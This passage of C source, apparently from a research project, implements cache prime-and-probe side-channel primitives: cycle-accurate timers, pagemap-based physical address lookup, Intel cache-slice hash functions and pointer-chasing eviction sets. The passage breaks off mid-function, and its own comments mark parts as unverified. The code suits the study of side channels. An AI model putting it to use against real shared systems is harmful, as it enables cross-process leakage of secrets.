
#include "ctattack.h"
#include <stdlib.h>
#include "unistd.h"
#include "inttypes.h"
#define PAGEMAP_LENGTH 8

// IMPLEMENTATION

unsigned int timestamp_weak(void) {
	unsigned int bottom;
	unsigned int top;
	asm volatile(".byte 15;.byte 49" : "=a"(bottom),"=d"(top));
	return bottom;
}

unsigned int timestamp(void) {
	//unsigned int bottom;
	//unsigned int top;
	unsigned int cycles_low;
	unsigned int cycles_high;
	//asm volatile(".byte 15;.byte 49" : "=a"(bottom),"=d"(top));
	asm volatile ("CPUID\n\t"
		"RDTSC\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
		"CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low)::"%rax", "%rbx", "%rcx", "%rdx");
	return cycles_low;
}

inline unsigned long int timestamp_start(void) {
	//unsigned int bottom;
	//unsigned int top;
	unsigned int cycles_low;
	unsigned int cycles_high;
	//asm volatile(".byte 15;.byte 49" : "=a"(bottom),"=d"(top));
	asm volatile (".align 16\n\t"
		"CPUID\n\t"
		"CPUID\n\t"
		"CPUID\n\t"
		"RDTSC\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::"%rax", "%rbx", "%rcx", "%rdx");
	return ((unsigned long int)cycles_high << 32) | cycles_low;
}

inline unsigned long int timestamp_stop(void) {
	//unsigned int bottom;
	//unsigned int top;
	unsigned int cycles_low;
	unsigned int cycles_high;
	//asm volatile(".byte 15;.byte 49" : "=a"(bottom),"=d"(top));
	asm volatile ("RDTSCP\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
		"CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low)::"%rax", "%rbx", "%rcx", "%rdx");
	return ((unsigned long int)cycles_high << 32) | cycles_low;
}





void ptr2bin(void* ptr, char bin[65]) {
	unsigned long int ptr_int = (unsigned long int)ptr;
	for (int i = 0; i < 64; ++i) {
		if (ptr_int & 0x1) bin[i] = '1'; else bin[i] = '0';
		ptr_int = ptr_int >> 1;
	}
	bin[64] = '\0';
}

void printPtr2bin(void* ptr) {
	char bin[65];
	ptr2bin((void *)ptr, bin);
	for (int i = 0; i < 8; ++i) {
		for (int j = 0; j < 8; ++j) {
			printf("%c", bin[63-(i*8+j)]);
		}
		printf(" ");
	}
	printf("\n");
}





unsigned long int get_global_timestamp_start(void) {
	return ((unsigned long int)cycles_high_start << 32) | cycles_low_start;
}

unsigned long int get_global_timestamp_stop(void) {
	return ((unsigned long int)cycles_high_stop << 32) | cycles_low_stop;
}






/*
 *
 * SATTOLO ALGORITHM FUNCTIONS
 *
 */

static int rand_int(int n) {
    int limit = RAND_MAX - RAND_MAX % n;
    int rnd;
    do {
        rnd = rand();
    } 
    while (rnd >= limit);
    return rnd % n;
}

 

void sattolo_shuffle(volatile void **array, int n) {
    int i, j;
    volatile void **tmp;
    for (i = n - 1; i > 0; i--) {
        j = rand_int(i + 1);
        tmp = array[j];
        array[j] = array[i];
        array[i] = tmp;
   }

}












// VIRTUAL TO PHYSICAL

unsigned long get_pfn(void *addr) {
   // Open the pagemap file for the current process
   FILE *pagemap = fopen("/proc/self/pagemap", "rb");

   // Seek to the page that the buffer is on
   unsigned long offset = (unsigned long)addr / getpagesize() * PAGEMAP_LENGTH;
   if(fseek(pagemap, (unsigned long)offset, SEEK_SET) != 0) {
      fprintf(stderr, "Failed to seek pagemap to proper location\n");
      exit(1);
   }

   // The page frame number is in bits 0-54 so read the first 7 bytes and clear the 55th bit
   unsigned long page_frame_number = 0;
   fread(&page_frame_number, 1, PAGEMAP_LENGTH-1, pagemap);

   page_frame_number &= 0x7FFFFFFFFFFFFF;

   fclose(pagemap);

   return page_frame_number;
}










// NEHALEM FUNCTIONS

int nehalem_cache_slice_alg(void* addr) {
    return (((unsigned long int)addr & 0x000020000) >> 17);
}
	
int nehalem_setup(unsigned long int monline) {
	unsigned long int cache_line_check_offset = monline & 0x00003FFFF;
	size_t mem_length = (size_t)MB(2); 
	unsigned long int x = 0;
    //int mem_length_char = ((int)mem_length/sizeof(char));
    //int mem_length_ptr = (int)mem_length/sizeof(void *);

	B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // check if memory was properly allocated

	x += (unsigned long int)B[MB(0)];
	x += (unsigned long int)C[MB(0)];

    //printf("B : %p\n", (void *)get_pfn(B));
    //printf("C : %p\n", (void *)get_pfn(C));

    B[(0x00 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x01 << 18)/8 + cache_line_check_offset/8);
    B[(0x01 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x02 << 18)/8 + cache_line_check_offset/8);
    B[(0x02 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x03 << 18)/8 + cache_line_check_offset/8);
    B[(0x03 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x04 << 18)/8 + cache_line_check_offset/8);
    B[(0x04 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x05 << 18)/8 + cache_line_check_offset/8);
    B[(0x05 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x06 << 18)/8 + cache_line_check_offset/8);
    B[(0x06 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x07 << 18)/8 + cache_line_check_offset/8);
    B[(0x07 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x00 << 18)/8 + cache_line_check_offset/8);

    C[(0x00 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x01 << 18)/8 + cache_line_check_offset/8);
    C[(0x01 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x02 << 18)/8 + cache_line_check_offset/8);
    C[(0x02 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x03 << 18)/8 + cache_line_check_offset/8);
    C[(0x03 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x04 << 18)/8 + cache_line_check_offset/8);
    C[(0x04 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x05 << 18)/8 + cache_line_check_offset/8);
    C[(0x05 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x06 << 18)/8 + cache_line_check_offset/8);
    C[(0x06 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x07 << 18)/8 + cache_line_check_offset/8);
    C[(0x07 << 18)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x00 << 18)/8 + cache_line_check_offset/8);

    if ( ((0x07 << 18) + cache_line_check_offset + KB(32)) < MB(2) ) {
    	B[(0x00 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x01 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x01 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x02 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x02 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x03 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x03 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x04 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x04 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x05 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x05 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x06 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x06 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x07 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    B[(0x07 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x00 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);

	    C[(0x00 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x01 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x01 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x02 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x02 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x03 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x03 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x04 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x04 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x05 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x05 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x06 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x06 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x07 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);
	    C[(0x07 << 18)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x00 << 18)/8 + cache_line_check_offset/8 + KB(32)/8);

	    init_reprime = B + cache_line_check_offset/8 + KB(32)/8;
    } else {
    	B[(0x00 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x01 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x01 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x02 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x02 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x03 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x03 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x04 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x04 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x05 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x05 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x06 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x06 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x07 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    B[(0x07 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x00 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);

	    C[(0x00 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x01 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x01 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x02 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x02 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x03 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x03 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x04 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x04 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x05 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x05 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x06 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x06 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x07 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);
	    C[(0x07 << 18)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x00 << 18)/8 + cache_line_check_offset/8 - KB(32)/8);

	    init_reprime = B + cache_line_check_offset/8 - KB(32)/8;
    }


    init_prime = B + cache_line_check_offset/8;
    

    return 1;
}

void nehalem_prime() {
	TIMESTAMP_START;
    TIMESTAMP_STOP;
    TIMESTAMP_START;
    TIMESTAMP_STOP;
	volatile char **tmp1 = init_prime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

void nehalem_reprime() {
	volatile char **tmp1 = init_reprime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

unsigned long int nehalem_probe() {
	// PROBE & MEASURE
	unsigned long int begin, end;
	//unsigned long int begin2, end2;
    volatile char **tmp1 = init_prime;
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
/*
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    begin2 = get_global_timestamp_start();
    end2 = get_global_timestamp_stop();
*/
    return (end-begin);//-(end2-begin2);
}



int ivybridge_i7_3770_cache_slice_from_virt(void* addr) {
    unsigned long int x = ((unsigned long int*)addr)[0];
    return ivybridge_i7_3770_cache_slice_alg((void*)(get_pfn(addr) << 12));
}

int ivybridge_i7_3770_cache_slice_alg(void* addr) {
    //printf("ivybridge_i7_3770_cache_slice\n");
    //unsigned long int x = ((unsigned long int*)addr)[0];
    //unsigned long int i_addr = (unsigned long int) get_pfn(addr);
    
    printf("\n%016p : \n", (void *) addr);

    unsigned long int i_addr = (unsigned long int) addr;

/*
    printf("vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv\n");
    printPtr2bin((void *) addr);
    printf("17:%lu 18:%lu 20:%lu 22:%lu 24:%lu 25:%lu 26:%lu 27:%lu 28:%lu 30:%lu 32:%lu\n", ((i_addr & 0x000020000) >> 17), ((i_addr & 0x000040000) >> 18), 
                ((i_addr & 0x000100000) >> 20), ((i_addr & 0x000400000) >> 22), ((i_addr & 0x001000000) >> 24), ((i_addr & 0x002000000) >> 25),
                ((i_addr & 0x004000000) >> 26), ((i_addr & 0x008000000) >> 27), ((i_addr & 0x010000000) >> 28), ((i_addr & 0x040000000) >> 30), 
                ((i_addr & 0x100000000) >> 32));
    printf("18:%lu 19:%lu 21:%lu 23:%lu 25:%lu 27:%lu 29:%lu 30:%lu 31:%lu 32:%lu\n", ((i_addr & 0x000040000) >> 18), ((i_addr & 0x000080000) >> 19), 
                ((i_addr & 0x000200000) >> 21), ((i_addr & 0x000800000) >> 23), ((i_addr & 0x002000000) >> 25), ((i_addr & 0x008000000) >> 27), 
                ((i_addr & 0x020000000) >> 29), ((i_addr & 0x040000000) >> 30), ((i_addr & 0x080000000) >> 31), ((i_addr & 0x100000000) >> 32));
    printf("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
*/


    // According to Systematic Reverse Engineering of Cache Slice Selection in Intel Processors
    // Intel i7-4702M Haswell (4 cores)
    // Intel Xeon E5-2609 v2 Ivy Bridge (4 cores)
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x100000000) >> 32);

    int bit1 = ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000200000) >> 21) ^ ((i_addr & 0x000800000) >> 23) 
             ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x008000000) >> 27) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x040000000) >> 30) 
             ^ ((i_addr & 0x080000000) >> 31) ^ ((i_addr & 0x100000000) >> 32);

/*
    // According to Reverse Engineering Intel Last-Level Cache Complex Addressing Using Performace Counters
    // Xeon & Core (4 core - from bit 17 and above)
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x100000000) >> 32) ^ ((i_addr & 0x200000000) >> 33);

    int bit1 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000200000) >> 21)
             ^ ((i_addr & 0x000400000) >> 22) ^ ((i_addr & 0x000800000) >> 23) ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x004000000) >> 26) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x080000000) >> 31) ^ ((i_addr & 0x200000000) >> 33)
             ^ ((i_addr & 0x400000000) >> 34);
*/

    return ((bit1 << 1) | bit0);
}


// Ivy Bridge i7-3770 FUNCTIONS
    
int ivybridge_i7_3770_setup(unsigned long int monline) {
    //printf("ivybridge_i7_3770_setup\n");
    unsigned long int cache_line_check_offset = monline & 0x00001FFFF;  // 0001 1111 1111 1111 1111
    printPtr2bin((void *)cache_line_check_offset);
    size_t mem_length = (size_t)MB(2); 
    unsigned long int x = 0;
    int i = 0;
    //int mem_length_char = ((int)mem_length/sizeof(char));
    //int mem_length_ptr = (int)mem_length/sizeof(void *);

// Cache slice selection algorithm needs verification
// p17 ⊕ p18 ⊕ p20 ⊕ p22 ⊕ p24 ⊕ p25 ⊕ p26 ⊕ p27 ⊕ p28 ⊕ p30 ⊕ p32
// p18 ⊕ p19 ⊕ p21 ⊕ p23 ⊕ p25 ⊕ p27 ⊕ p29 ⊕ p30 ⊕ p31 ⊕ p32

    int monline_cache_slice = ivybridge_i7_3770_cache_slice_alg((void *) monline);
    printf("monline_cache_slice\t:\t%d\n", monline_cache_slice);

    void *tmp[128];
    int B_idx = -1;
    int C_idx = -1;
    int D_idx = -1;
    int E_idx = -1;

    int cache_slice_pattern[4][4];

    cache_slice_pattern[0][0] = 0x0;
    cache_slice_pattern[0][1] = 0x7;
    cache_slice_pattern[0][2] = 0x9;
    cache_slice_pattern[0][3] = 0xe;

    cache_slice_pattern[1][0] = 0x1;
    cache_slice_pattern[1][1] = 0x6;
    cache_slice_pattern[1][2] = 0x8;
    cache_slice_pattern[1][3] = 0xf;

    cache_slice_pattern[2][0] = 0x2;
    cache_slice_pattern[2][1] = 0x5;
    cache_slice_pattern[2][2] = 0xb;
    cache_slice_pattern[2][3] = 0xc;

    cache_slice_pattern[3][0] = 0x3;
    cache_slice_pattern[3][1] = 0x4;
    cache_slice_pattern[3][2] = 0xa;
    cache_slice_pattern[3][3] = 0xd;


    for (i = 0; i < 128; ++i) tmp[i] = NULL;

    for (i = 0; i < 128; ++i) {
        tmp[i] = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
        printf("ivybridge_i7_3770_cache_slice_from_virt(tmp[i])\t:\t%d\n", ivybridge_i7_3770_cache_slice_from_virt(tmp[i]));
        //x += (unsigned long int)(*((unsigned int)tmp[i]));
        if (ivybridge_i7_3770_cache_slice_from_virt(tmp[i]) == 0) {     //monline_cache_slice
            if (B_idx == -1) {
                B = tmp[i];
                B_idx = i;
                continue;
            }
            if (C_idx == -1) {
                C = tmp[i];
                C_idx = i;
                continue;
            }
            if (D_idx == -1) {
                D = tmp[i];
                D_idx = i;
                continue;
            }
            if (E_idx == -1) {
                E = tmp[i];
                E_idx = i;
                break;
            }
        }
    }
    
    printf("B_idx\t:\t%d\n", B_idx);
    printf("C_idx\t:\t%d\n", C_idx);
    printf("D_idx\t:\t%d\n", D_idx);
    printf("E_idx\t:\t%d\n", E_idx);

    if (B_idx == -1 || C_idx == -1 || D_idx == -1 || E_idx == -1) return 0;

    // THIS FOR LOOP NEEDS REVISION (is munmap((void *) addr, size_t length) relieasing the hugepage as expected?)
    for (i = 0; i < 128; ++i) {
        //printf("i\t:\t%d\n", i);
        if (i != B_idx && i != C_idx && i != D_idx && i != E_idx && tmp[i] != NULL) {
            munmap(tmp[i], MB(2));
        }
    }



    //B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    //C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // check if memory was properly allocated

    x += (unsigned long int)B[MB(0)];
    x += (unsigned long int)C[MB(0)];
    x += (unsigned long int)D[MB(0)];
    x += (unsigned long int)E[MB(0)];

    //printf("B : %p\n", (void *)get_pfn(B));
    //printf("C : %p\n", (void *)get_pfn(C));


    B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);




    if ( ((cache_slice_pattern[monline_cache_slice][3] << 17) + cache_line_check_offset + KB(32)) < MB(2) ) {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
